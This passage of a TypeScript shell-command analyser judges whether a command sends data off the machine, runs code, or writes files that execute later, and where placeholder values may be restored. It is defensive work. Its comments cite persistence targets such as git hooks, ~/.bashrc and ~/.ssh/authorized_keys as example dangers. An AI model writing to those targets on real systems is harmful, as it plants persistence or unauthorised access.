   * target, the arguments of `cd`, `export`, `alias` and the like. */
  readonly programAt: ReadonlySet<number>;
  /** How the command splits: its simple commands and heredoc bodies. */
  readonly layout: Layout;
}

/** The extents a command splits into, in the order the lexer met them. */
interface Layout {
  readonly commands: ReadonlyArray<readonly [number, number]>;
  readonly bodies: ReadonlyArray<readonly [number, number]>;
}

/** The verdict for a command that cannot be read whole: nothing comes back. */
const KEEP_ALL: Verdict = {
  offMachine: true,
  runsCode: true,
  contextAt: new Map(),
  programAt: new Set(),
  layout: { commands: [], bodies: [] },
};

/** True when `name` is one of the `SHELL_TOOLS`. */
export function isShellTool(name: unknown): boolean {
  return typeof name === 'string' && SHELL_TOOLS.has(name);
}

/** True when `command` sends data off the machine: a network client or an
 * upload, behind any wrapper, or code it runs that opens a URL or a
 * socket. */
export function sendsOffMachine(command: string): boolean {
  return judge(command, []).offMachine;
}

/** True when `value` can be put back as written in `context`: one plain
 * word, or in a data heredoc body a value that cannot end the body. */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (isDataBody(context)) return DATA_BODY_SAFE[context].test(value);
  return PLAIN_WORD.test(value);
}

function isDataBody(context: QuoteContext): context is DataBodyContext {
  return DATA_BODY_CONTEXTS.has(context);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command runs code it
 * is handed, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  return judge(command, [index]).contextAt.get(index) ?? 'none';
}

/** Read `command` once and judge it at each of `targets` (ascending). */
function judge(command: string, targets: readonly number[]): Verdict {
  if (command.length > MAX_COMMAND_CHARS) {
    return KEEP_ALL;
  }
  const scan: Scan = {
    targets,
    contexts: [],
    commands: [],
    dataBodies: [],
    bodies: [],
    substitutionBodies: [],
    outputs: [],
    line: { end: -1, lastPipe: -1 },
    heredocCommand: { start: -1, word: '' },
    heredocOperator: new RegExp(HEREDOC_OPERATOR.source, 'y'),
    broken: false,
  };
  const closed = lex(command, 0, command.length, codeFrame(), scan, command.length) && !scan.broken;
  if (scan.broken) {
    return KEEP_ALL;
  }
  const read = readCommands(command, scan);
  if (read === undefined) return KEEP_ALL;
  const { programs, wordsAt } = read;
  // Data bodies are text written out, not commands: a commit message that
  // mentions `ssh` or `bash -c` neither sends nor runs anything.
  const code = withoutRanges(command, scan.dataBodies);
  // A program run by path (`./build.sh`) or a file made executable runs
  // code too.
  const strict = NESTED_INTERPRETER.test(code) || programs.some((p) => runsCode(p) || runsFile(p));
  // A data body written to a file that a shell, git or a hook runs later
  // is code: `cat > .git/hooks/pre-commit <<'EOF'`, `cat >> ~/.bashrc`.
  const written = scan.outputs.filter((t) => !NO_FILE_TARGETS.has(t));
  const writesFiles =
    scan.dataBodies.length > 0 ||
    written.length > 0 ||
    programs.some((p) => p.name !== undefined && FILE_WRITERS.has(p.name));
  // A command that names a file run later (a git hook, a shell start-up
  // file, a directory on PATH) can put a value there by any means:
  // `cp {{…}} .git/hooks/pre-commit`, `mv {{…}} ~/.zshrc`.
  const writesExecuted =
    writesFiles && (EXECUTED_LATER.test(code) || written.some((t) => EXECUTED_LATER.test(` ${t}`)));
  // `offMachine` also covers a program whose code no word is safe in.
  const offMachine =
    ANY_DELIMITER_IN_TEXT.test(code) ||
    programs.some((p) => p.name !== undefined && ANY_DELIMITER_PROGRAMS.has(p.name)) ||
    NETWORK_CLIENT.test(code) ||
    programs.some(sendsOut) ||
    (strict && NETWORK_IN_CODE.test(code)) ||
    (URL_SCHEME.test(code) && !programs.every(isDataProgram));
  // A data body goes to standard output or to a plain document file; one
  // written elsewhere (`.git/config`, `Makefile`, `run.sh`) may be read
  // as code later.
  const toPlainFiles = written.every(isDocument);
  const bodyContext = dataBodyContext(
    programs,
    strict || !closed || writesExecuted || !toPlainFiles,
  );
  // Any program outside the allowlist (`ARG_DATA_PROGRAMS`) keeps every
  // placeholder too: the lists above are a second line, not the rule.
  const unlisted = !programs.every(takesDataArgs);
  // A command that writes anything but a document, through a heredoc or
  // any other redirection (`echo {{…}} > run.sh`), may have it read later
  // as code or configuration: nothing comes back into it.
  const toCodeFile = !toPlainFiles;
  // Nothing comes back from a command judged whole: its positions need no
  // reading.
  const keepAll = offMachine || strict || writesExecuted || unlisted || toCodeFile;
  const contextAt = new Map<number, QuoteContext>();
  const programAt = new Set<number>();
  const sorted = [...scan.commands].sort((a, b) => a[0] - b[0]);
  const substitutionBodies = outermost(scan.substitutionBodies);
  targets.forEach((index, k) => {
    const context = scan.contexts[k] ?? 'none';
    const nested = isDataBody(context) && insideAny(substitutionBodies, index);
    if (strict) contextAt.set(index, 'none');
    else if (nested) contextAt.set(index, bodyContext('heredoc-in-substitution'));
    else if (isDataBody(context)) contextAt.set(index, bodyContext(context));
    else contextAt.set(index, context);
    if (keepAll) return;
    if (holdsAt(index, sorted, wordsAt)) programAt.add(index);
  });
  return {
    offMachine,
    runsCode: strict || writesExecuted || unlisted || toCodeFile,
    contextAt,
    programAt,
    layout: { commands: scan.commands, bodies: scan.bodies },
  };
}

/** The words and program of every simple command `scan` met, heredoc
 * bodies skipped; `undefined` when a command is past the read window or
 * its words would be read past the scan budget. */
function readCommands(
  command: string,
  scan: Scan,
): { programs: Program[]; wordsAt: Map<number, Word[]> } | undefined {
  // Nested commands are read once each, so their words are read again for
  // every level: past a budget in proportion to the command, it keeps
  // every placeholder instead.
  let budget = SCAN_BUDGET_PER_CHAR * command.length + SCAN_BUDGET_BASE;
  const bodies = outermost(scan.bodies);
  const programs: Program[] = [];
  // Each command's words, read once, for every placeholder in it.
  const wordsAt = new Map<number, Word[]>();
  for (const [start, end] of scan.commands) {
    // A heredoc body is part of no command's words: a long commit message
    // does not push its command past the read window.
    const skips = bodies.length === 0 ? NO_RANGES : rangesWithin(bodies, start, end);
    const length = skips.reduce((n, [s, e]) => n - (e - s), end - start);
    budget -= length;
    // A simple command longer than the read window is not judged by the
    // part that was read: its later words could be options, redirections
    // or a program the rules never see.
    if (budget < 0 || length > MAX_WORD_SCAN) return undefined;
    if (isBlank(command, start, end)) continue;
    const relative =
      skips.length === 0 ? NO_RANGES : skips.map(([s, e]) => [s - start, e - start] as const);
    const words = wordsOf(command.slice(start, end), relative);
    if (words.length >= MAX_WORDS) return undefined;
    wordsAt.set(start, words);
    const p = programOf(words);
    if (p !== undefined) programs.push(p);
  }
  return { programs, wordsAt };
}

const NO_RANGES: ReadonlyArray<readonly [number, number]> = [];

/** The ranges of `ranges` (in the order read, nested ones after the one
 * they sit in) that no earlier range holds. */
function outermost(
  ranges: ReadonlyArray<readonly [number, number]>,
): Array<readonly [number, number]> {
  const out: Array<readonly [number, number]> = [];
  for (const range of ranges) {
    const last = out.at(-1);
    if (last === undefined || range[0] >= last[1]) out.push(range);
  }
  return out;
}

/** The ranges of `sorted` (disjoint, ascending) that start within
 * `[start, end)`, cut at `end`. */
function rangesWithin(
  sorted: ReadonlyArray<readonly [number, number]>,
  start: number,
  end: number,
): Array<readonly [number, number]> {
  let lo = 0;
  let hi = sorted.length;
  while (lo < hi) {
    const mid = (lo + hi) >>> 1;
    if ((sorted[mid]?.[0] ?? end) < start) lo = mid + 1;
    else hi = mid;
  }
  const out: Array<readonly [number, number]> = [];
  for (let k = lo; k < sorted.length; k++) {
    const range = sorted[k];
    if (range === undefined || range[0] >= end) break;
    out.push([range[0], Math.min(range[1], end)]);
  }
  return out;
}

/** True when `index` lies in one of `sorted` (disjoint, ascending). */
function insideAny(sorted: ReadonlyArray<readonly [number, number]>, index: number): boolean {
  const [range] = rangesWithin(sorted, 0, index + 1).slice(-1);
  return range !== undefined && index < range[1];
}

/** True when `command` holds only whitespace from `start` to `end`. */
function isBlank(command: string, start: number, end: number): boolean {
  for (let k = start; k < end; k++) {
    if (!FIELD_SEPARATORS.has(command[k] ?? '')) return false;
  }
  return true;
}

/** `text` with each of `ranges` blanked out, offsets kept. */
function withoutRanges(text: string, ranges: ReadonlyArray<readonly [number, number]>): string {
  let out = '';
  let last = 0;
  for (const [start, end] of ranges) {
    out += text.slice(last, start) + ' '.repeat(end - start);
    last = end;
  }
  return out + text.slice(last);
}

/** True when no value may be restored at `index`: the placeholder stands
 * in the program word of the innermost simple command around it (the
 * words before it are only keywords, assignments, redirections and
 * wrappers), in an assignment, in a redirection target, or in the
 * arguments of `cd`, `export`, `alias` and the like. A command past the
 * read window never gets here: `judge` keeps every placeholder of it. */
function holdsAt(
  index: number,
  sorted: ReadonlyArray<readonly [number, number]>,
  wordsAt: ReadonlyMap<number, readonly Word[]>,
): boolean {
  const start = innermostStart(sorted, index);
  if (start === undefined) return false;
  if (start === DEEP) return true;
  const words = wordsAt.get(start);
  // Defensive: every command with a placeholder has its words read. One
  // without, or a placeholder in none of them (after a comment), has an
  // unknown role, so it is held.
  if (words === undefined) return true;
  const offset = index - start;
  const k = words.findIndex((w) => w.end > offset);
  const own = words[k];
  if (own === undefined || own.start > offset) return true;
  const before = words.slice(0, k);
  // An assignment before the program sets the environment it runs with;
  // `--grep user={{…}}` after it is an argument.
  if (ENV_ASSIGNMENT.test(own.text) && programIsNext(before)) return true;
  // A redirection target is a file the command writes or reads: a value
  // there would choose which (`> ~/.ssh/authorized_keys`).
  if (REDIRECTION.test(own.text)) return true;
  if (before.length > 0 && REDIRECTION.exec(before.at(-1)?.text ?? '')?.[1] === '') return true;
  if (programIsNext(before)) return true;
  // `cd` chooses the directory every later command runs in, this one's
  // and, in a shell kept across calls, the next one's (git reads its
  // configuration and hooks there).
  const program = programOf(before);
  if (program?.name === 'cd') return true;
  return program?.name !== undefined && ENVIRONMENT_BUILTINS.has(program.name);
}

/** The start of the innermost command extent around `index`, from
 * extents sorted by start: the latest start at or before `index` whose
 * extent reaches it. Nested extents start after the one they sit in. */
function innermostStart(
  sorted: ReadonlyArray<readonly [number, number]>,
  index: number,
): number | undefined {
  let lo = 0;
  let hi = sorted.length;
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    if ((sorted[mid]?.[0] ?? 0) <= index) lo = mid + 1;
    else hi = mid;
  }
  for (let k = lo - 1; k >= 0; k--) {
    // Past the nesting window the enclosing command is unknown: held.
    if (lo - k > MAX_NESTING) return DEEP;
    const extent = sorted[k];
    if (extent !== undefined && extent[1] >= index) return extent[0];
  }
  return undefined;
}

/** `innermostStart` found too many nested commands to tell which one a
 * placeholder is in. */
const DEEP = -1;

/** True when the word after `words` would be the program they run. */
function programIsNext(words: readonly Word[]): boolean {
  let k = skipPrefix(words, 0);
  const first = words[k];
  if (first !== undefined && NO_PROGRAM_KEYWORDS.has(first.text)) return false;
  for (;;) {
    const word = words[k];
    if (word === undefined) return true;
    const name = word.computed ? undefined : normalise(word.text);
    const options = name === undefined ? undefined : WRAPPERS.get(name);
    if (options === undefined || name === undefined) return false;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** What a data heredoc body's context becomes, given the programs the
 * command runs: kept when they all treat it as data, the strictest rule
 * when one runs a file, else the double-quote rule. */
function dataBodyContext(
  programs: readonly Program[],
  strict: boolean,
): (context: QuoteContext) => QuoteContext {
  if (strict || programs.some(runsFile)) return () => 'none';
  if (programs.every(isDataProgram)) return (context) => context;
  return () => 'double';
}

function runsCode(p: Program): boolean {
  if (p.name === undefined || p.wrapperShell) return true;
  if (CODE_RUNNERS.has(p.name) || p.wrappers.some((w) => CODE_RUNNERS.has(w))) return true;
  const subcommands = CODE_SUBCOMMANDS.get(p.name);
  if (
    subcommands !== undefined &&
    (subcommands.size === 0 || p.args.some((a) => subcommands.has(a)))
  ) {
    return true;
  }
  const option = COMMAND_OPTIONS.get(p.name);
  return option !== undefined && p.args.some((a) => option.test(a));
}

function sendsOut(p: Program): boolean {
  if (p.name === undefined) return false;
  if (NETWORK_PROGRAMS.has(p.name)) return true;
  const subcommands = NETWORK_SUBCOMMANDS.get(p.name);
  return subcommands !== undefined && p.args.some((a) => subcommands.has(a));
}

function runsFile(p: Program): boolean {
  return p.byPath || (p.name !== undefined && RUNS_FILE_PROGRAMS.has(p.name));
}

/** True when a value may be restored into `p`'s command (`ARG_DATA_PROGRAMS`). */
function takesDataArgs(p: Program): boolean {
  if (p.name === undefined || p.wrappers.length > 0 || p.byPath) return false;
  if (p.redirectedPrefix) return false;
  // A computed argument can expand to an option (`$'--pre'`); only
  // `git commit`'s message, built from a heredoc (`-m "$(cat <<'EOF' …)"`),
  // may be one.
  if (p.computedArgs && !(p.name === 'git' && p.args[0] === 'commit')) return false;
  if (p.name === 'git') return ARG_DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return ARG_DATA_PROGRAMS.has(p.name);
}

function isDataProgram(p: Program): boolean {
  if (p.name === undefined || p.wrappers.length > 0 || p.byPath) return false;
  if (p.name === 'git') return DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return DATA_PROGRAMS.has(p.name);
}

/** The words at the start of a simple command, up to `MAX_WORDS` and a
 * `#` comment. Each of `skips` (heredoc bodies, ascending) is part of the
 * word it stands in, and none of its text is read. */
function wordsOf(text: string, skips: ReadonlyArray<readonly [number, number]> = []): Word[] {
  const words: Word[] = [];
  let word = '';
  let inWord = false;
  let computed = false;
  let quote: string | undefined;
  let wordStart = 0;
  let i = 0;
  let nextSkip = 0;
  const begin = (): void => {
    if (!inWord) wordStart = i;
    inWord = true;
  };
  // Only a word's start matters (a program name, an option, an
  // assignment), so a long word is kept to its first characters.
  const add = (ch: string): void => {
    begin();
    if (word.length < MAX_WORD_CHARS) word += ch;
  };
  const flush = (): void => {
    if (inWord) words.push({ text: word, computed, start: wordStart, end: i });
    word = '';
    inWord = false;
    computed = false;
  };
  for (; i < text.length && words.length < MAX_WORDS; i++) {
    const skip = skips[nextSkip];
    if (skip !== undefined && i >= skip[0]) {
      nextSkip += 1;
      if (i < skip[1]) {
        begin();
        i = skip[1] - 1;
        continue;
      }
    }
    const ch = text[i] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else add(ch);
      continue;
    }
    if (ch === '\\') {
      // A backslash before a newline continues the line; before anything
      // else it makes that character literal.
      const next = text[i + 1] ?? '';
      if (next !== '\n') add(next);
      i++;
      continue;
    }
    if (ch === '$' || ch === '`') computed = true;
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else add(ch);
      continue;
    }
    if (ch === '#' && !inWord) break;
    if (ch === "'" || ch === '"') {
      begin();
      quote = ch;
    } else if (FIELD_SEPARATORS.has(ch)) flush();
    else add(ch);
  }
  if (words.length < MAX_WORDS) flush();
  return words;
}

/** The program a simple command runs: past shell keywords, environment
 * assignments, redirections and wrappers with their options. `undefined`
 * when it runs none (`for`, `fi`, a bare assignment). */
function programOf(words: readonly Word[]): Program | undefined {
  let k = skipPrefix(words, 0);
  const redirectedPrefix = words.slice(0, k).some((w) => REDIRECTION.test(w.text));
  const first = words[k];
  if (first === undefined || NO_PROGRAM_KEYWORDS.has(first.text)) return undefined;
  const wrappers: string[] = [];
  let wrapperShell = false;
  for (;;) {
    const word = words[k];
    // A wrapper with nothing after it runs on its own (`xargs` reads the
    // command from its input).
    if (word === undefined) {
      const last = wrappers.at(-1);
      if (last === undefined) return undefined;
      return {
        name: last,
        byPath: false,
        wrappers,
        wrapperShell,
        args: [],
        redirectedPrefix,
        computedArgs: false,
      };
    }
    const name = word.computed ? undefined : normalise(word.text);
    const options = name === undefined ? undefined : WRAPPERS.get(name);
    if (options === undefined || name === undefined) {
      const rest = words.slice(k + 1);
      return {
        name,
        byPath: word.text.includes('/'),
        wrappers,
        wrapperShell,
        args: rest.map((w) => w.text),
        redirectedPrefix,
        computedArgs: rest.some((w) => w.computed),
      };
    }
    wrappers.push(name);
    const skipped = skipWrapperArgs(words, k + 1, name, options);
    wrapperShell ||= skipped.shell;
    k = skipped.next;
  }
}

/** Skip a wrapper's options (with their arguments), assignments and
 * positional arguments from `k`, up to the program it runs; `shell` when
 * one of those options makes it run a shell on a string. */
function skipWrapperArgs(
  words: readonly Word[],
  k: number,
  wrapper: string,
  options: ReadonlySet<string>,
): { next: number; shell: boolean } {
  const shellOption = WRAPPER_SHELL_OPTION.get(wrapper);
  let left = WRAPPER_POSITIONALS.get(wrapper) ?? 0;
  let shell = false;
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return { next: i, shell };
    if (text.startsWith('-') && text !== '-') {
      shell ||= shellOption?.test(text) === true;
      i += options.has(text) ? 2 : 1;
    } else if (ENV_ASSIGNMENT.test(text)) i += 1;
    else if (left > 0) {
      left -= 1;
      i += 1;
    } else return { next: i, shell };
  }
}

/** Skip shell keywords, assignments and redirections from `k`. */
function skipPrefix(words: readonly Word[], k: number): number {
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return i;
    if (LEADING_KEYWORDS.has(text) || ENV_ASSIGNMENT.test(text)) {
      i += 1;
      continue;
    }
    const m = REDIRECTION.exec(text);
    if (m === null) return i;
    i += m[1] === '' ? 2 : 1;
  }
}

/** A program name as the sets list it: no directory, lower case, no
 * version or `.exe` suffix (`/usr/bin/Python3.12` → `python`). */
function normalise(word: string): string {
  const base = (word.split('/').at(-1) ?? word).toLowerCase();
  // `base64` is a name, not `base` version 64.
  if (ARG_DATA_PROGRAMS.has(base)) return base;
  const bare = base.replace(PROGRAM_SUFFIX, '');
  return bare === '' ? base : bare;
}

function codeFrame(): Frame {
  return { kind: 'code', depth: 0, cmdStart: 0 };
}

/** Lex `command` from `start` to `end`, with `base` as the nesting in
 * force at `start`: record the context at each target in range, and the
 * extent of each simple command of shell code. */
function lex(
  command: string,
  start: number,
  end: number,
  base: Frame,
  scan: Scan,
  limit: number,
): boolean {
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = start;
  while (i < end) {
    record(scan, i, contextOf(stack));
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
      scan.commands.push([frame.cmdStart, i]);
      const next = readHeredocBodies(command, i + 1, pending, scan, limit);
      // An unreadable delimiter or no closing line: the body's extent, and
      // so every command after it, is unknown (inside `$(…)`, bash 5.2 ends
      // a body at a line `EOF)`), so the command is not read at all.
      if (next === undefined) {
        scan.broken = true;
        return false;
      }
      pending.length = 0;
      frame.cmdStart = next;
      i = next;
      continue;
    }
    i += advance(stack, frame, pending, command, i, scan);
    if (stack.length > MAX_NESTING) {
      scan.broken = true;
      return false;
    }
  }
  record(scan, end - 1, contextOf(stack));
  for (const frame of stack) {
    if (CODE_KINDS.has(frame.kind)) scan.commands.push([frame.cmdStart, end]);
  }
  return stack.length === 1 && pending.length === 0;
}

/** Give `context` to every target not yet recorded up to `limit`. */
function record(scan: Scan, limit: number, context: QuoteContext): void {
  for (;;) {
    const target = scan.targets[scan.contexts.length];
    if (target === undefined || target > limit) return;
    scan.contexts.push(context);
  }
}

function contextOf(stack: readonly Frame[]): QuoteContext {
  const kind = stack.at(-1)?.kind;
  if (kind === 'single' || kind === 'ansi') return 'single';
  if (kind === 'double') return 'double';
  if (kind === 'body') return 'heredoc-expanding';
  return 'none';
}

/** Read the token at `i`, update the nesting, return its length. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (frame.kind === 'ansi') {
    if (ch === '\\') return 2;
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2, opened: i });
    return 2;
  }
  if (ch === '`') {
    if (frame.kind === 'backtick') closeCommand(stack, frame, i, scan);
    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  if (frame.kind === 'body') return 1;
  return advanceCode(stack, frame, pending, command, i, scan);
}

/** One token of shell code: the top level, or inside a substitution. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
  if (ch === '<' && command[i + 1] === '<') {
    return readHeredocOperator(command, i, frame, pending, scan);
  }
  if (ch === '>') return readOutputRedirection(command, i, scan);
  if (ch === '$' && command[i + 1] === "'") {
    stack.push({ kind: 'ansi', depth: 0, cmdStart: 0 });
    return 2;
  }
  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
  else if (frame.kind === 'subst') trackParens(stack, frame, command, i, scan);
  if (separatesCommands(command, i)) {
    scan.commands.push([frame.cmdStart, i]);
    frame.cmdStart = i + 1;
  }
  return 1;
}

/** True when the character at `i` of shell code ends a simple command.
 * `{` only as the grouping word (`{ cmd; }`), not in `${x}` or `-I{}`;
 * `&` only as an operator, not in a redirection (`<&3`, `&>log`); `\<&`
 * is a literal `<` and then `&`. */
function separatesCommands(command: string, i: number): boolean {
  const ch = command[i];
  if (ch === undefined || !COMMAND_SEPARATORS.has(ch)) return false;
  if (ch === '{') return startsWord(command, i) && WHITESPACE.test(command[i + 1] ?? '');
  // `>|` is a redirection that overrides noclobber, not a pipe; `\>|` is a
  // literal `>` and then a pipe.
  if (ch === '|') return !isClobberBar(command, i);
  if (ch !== '&') return true;
  const redirects = REDIRECTION_SIDES.has(command[i - 1] ?? '') && !escapedAt(command, i - 1);
  return !redirects && command[i + 1] !== '>';
}

/** True when the `|` at `i` belongs to the redirection `>|`: an
 * unescaped `>` just before it. */
function isClobberBar(command: string, i: number): boolean {
  return command[i - 1] === '>' && !escapedAt(command, i - 1);
}

/** True when the character at `k` is escaped: an odd number of
 * backslashes stands just before it. */
function escapedAt(command: string, k: number): boolean {
  let backslashes = 0;
  for (let j = k - 1; j >= 0 && command[j] === '\\'; j--) backslashes += 1;
  return backslashes % 2 === 1;
}

/** Record the file the output redirection whose `>` is at `i` writes
 * (`>`, `>>`, `>|`, `>!`, `&>`, `&>>`, `>&FILE`, `<>`); return the
 * operator's length, so the target is lexed as the word it is. A `>&`
 * that copies or closes a descriptor (`2>&1`, `>&-`) writes no file. */
function readOutputRedirection(command: string, i: number, scan: Scan): number {
  let j = i + 1;
  if (command[j] === '>') j += 1;
  const duplicates = command[j] === '&';
  if (duplicates || command[j] === '|' || command[j] === '!') j += 1;
  const target = redirectionTarget(command, j);
  if (!(duplicates && DESCRIPTOR_TARGET.test(target))) scan.outputs.push(target);
  return j - i;
}

/** The redirection target word that starts at `j`, after blanks, quotes
 * removed. Empty when it expands (`$`, a backtick), holds a backslash,
 * leaves a quote open or is longer than `MAX_WORD_CHARS`: a target that
 * cannot be read is no document. */
function redirectionTarget(command: string, j: number): string {
  let k = j;
  while (command[k] === ' ' || command[k] === '\t') k += 1;
  let target = '';
  let quote: string | undefined;
  for (; k < command.length && target.length <= MAX_WORD_CHARS; k++) {
    const ch = command[k] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else target += ch;
      continue;
    }
    if (ch === '$' || ch === '`' || ch === '\\') return '';
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else target += ch;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    else if (TARGET_ENDS.has(ch)) break;
    else target += ch;
  }
  return quote === undefined && target.length <= MAX_WORD_CHARS ? target : '';
}

/** True when the character at `i` begins a word of shell code. */
function startsWord(command: string, i: number): boolean {
  const before = command[i - 1];
  return before === undefined || COMMENT_PRECEDERS.has(before);
}

/** A comment runs to the end of its line; the newline is left to the
 * caller, since heredoc bodies may start after it. */
function commentLength(command: string, i: number): number {
  const newline = command.indexOf('\n', i);
  return (newline === -1 ? command.length : newline) - i;
}

function trackParens(stack: Frame[], frame: Frame, command: string, i: number, scan: Scan): void {
  const ch = command[i];
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth > 0) {
    frame.depth -= 1;
    return;
  }
  // bash 3.2 (macOS's `/bin/bash`) finds the end of `$(…)` by scanning its
  // text for quotes and parentheses, heredoc bodies included; newer shells
  // parse the body as a body. A substitution with a heredoc whose end the
  // two readings place differently is not read.
  if (frame.heredoc === true && bash32SubstitutionEnd(command, frame.opened ?? -1) !== i) {
    scan.broken = true;
  }
  closeCommand(stack, frame, i, scan);
}

/** Where bash 3.2 ends the `$(…)` whose `$` is at `open`: quotes, escapes,
 * backticks and nested parentheses are tracked, heredocs and comments are
 * not. `-1` when it finds no end. */
function bash32SubstitutionEnd(command: string, open: number): number {
  if (open < 0) return -1;
  const stack: Array<'(' | '"' | '`'> = ['('];
  for (let j = open + 2; j < command.length; j++) {
    const ch = command[j];
    const top = stack.at(-1);
    if (ch === '\\') {
      j += 1;
    } else if (top === '`') {
      if (ch === '`') stack.pop();
    } else if (top === '"') {
      if (ch === '"') stack.pop();
      else if (ch === '`') stack.push('`');
      else if (ch === '$' && command[j + 1] === '(') {
        stack.push('(');
        j += 1;
      }
    } else if (ch === "'") {
      j = command.indexOf("'", j + 1);
      if (j === -1) return -1;
    } else if (ch === '"' || ch === '`' || ch === '(') {
      stack.push(ch);
    } else if (ch === ')') {
      stack.pop();
      if (stack.length === 0) return j;
    }
  }
  return -1;
}

/** Close a substitution at `i`, recording its last simple command. */
function closeCommand(stack: Frame[], frame: Frame, i: number, scan: Scan): void {
  scan.commands.push([frame.cmdStart, i]);
  stack.pop();
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * `<<<` is a here-string: the word after it is an ordinary argument. */
function readHeredocOperator(
  command: string,
  i: number,
  frame: Frame,
  pending: Heredoc[],
  scan: Scan,
): number {
  if (command[i + 2] === '<') return 3;
  // Shells disagree on a heredoc inside backticks (a backtick in its body
  // ends the substitution in every shell), so such a command is not read.
  if (frame.kind === 'backtick') scan.broken = true;
  if (frame.kind === 'subst') frame.heredoc = true;
  scan.heredocOperator.lastIndex = i;
  const m = scan.heredocOperator.exec(command);
  if (m === null) {
    pending.push({
      delimiter: undefined,
      literal: false,
      stripTabs: false,
      data: false,
      inSubstitution: false,
    });
    return 2;
  }
  if (scan.heredocCommand.start !== frame.cmdStart) {
    const head = command.slice(frame.cmdStart, Math.min(i, frame.cmdStart + MAX_WORD_SCAN));
    scan.heredocCommand = { start: frame.cmdStart, word: programOf(wordsOf(head))?.name ?? '' };
  }
  const word = scan.heredocCommand.word;
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: HEREDOC_DATA_COMMANDS.has(word) && !pipedLater(command, i, scan),
    inSubstitution: frame.kind === 'subst' || frame.kind === 'backtick',
  });
  return m[0].length;
}

/** True when a `|` follows `i` on its line. The line's end and last `|`
 * are found once per line. */
function pipedLater(command: string, i: number, scan: Scan): boolean {
  if (i > scan.line.end) {
    const newline = command.indexOf('\n', i);
    const end = newline === -1 ? command.length : newline;
    let lastPipe = -1;
    for (let k = end - 1; k > i; k--) {
      // `>|` is a redirection, not a pipe.
      if (command[k] === '|' && !isClobberBar(command, k)) {
        lastPipe = k;
        break;
      }
    }
    scan.line = { end, lastPipe };
  }
  return scan.line.lastPipe > i;
}

/** Walk the bodies of the heredocs that start at `start`, in order,
 * recording the targets in each; return where shell code resumes, or
 * `undefined` when a body has no closing line. */
function readHeredocBodies(
  command: string,
  start: number,
  pending: readonly Heredoc[],
  scan: Scan,
  limit: number,
): number | undefined {
  let bodyStart = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc, limit);
    if (end === undefined) return undefined;
    readBody(command, bodyStart, end.bodyEnd, heredoc, scan);
    bodyStart = end.next;
  }
  return bodyStart;
}

/** Record the targets in one body. A bare-delimiter body is lexed too,
 * since its substitutions run whatever reads the body. */
function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
  // A body that expands keeps its substitutions in the text the network
  // checks read; one with none is plain text.
  const expands = !heredoc.literal && /[$`]/.test(command.slice(start, end));
  scan.bodies.push([start, end]);
  if (heredoc.inSubstitution) scan.substitutionBodies.push([start, end]);
  if (heredoc.data && !expands) scan.dataBodies.push([start, end]);
  if (!heredoc.data) record(scan, end - 1, 'none');
  else if (heredoc.literal) record(scan, end - 1, 'heredoc');
  if (heredoc.literal) return;
  // The body's own heredocs end inside it; one that does not, or a body
  // whose nesting cannot be read, leaves the command unread.
  if (!lex(command, start, end, { kind: 'body', depth: 0, cmdStart: 0 }, scan, end)) {
    scan.broken = true;
  }
}

/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
  limit: number,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= limit) {
    const found = command.indexOf('\n', lineStart);
    const newline = found === -1 || found >= limit ? -1 : found;
    const lineEnd = newline === -1 ? limit : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    // Inside `$(…)`, bash 5.2 also ends the body at the delimiter followed
    // by `)`, older shells do not: such a body cannot be read.
    if (heredoc.inSubstitution && closesSubstitution(candidate, heredoc.delimiter)) {
      return undefined;
    }
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** True when `line` is `delimiter` then blanks and `)`. */
function closesSubstitution(line: string, delimiter: string): boolean {
  return line.startsWith(delimiter) && DELIMITER_PAREN.test(line.slice(delimiter.length));
}

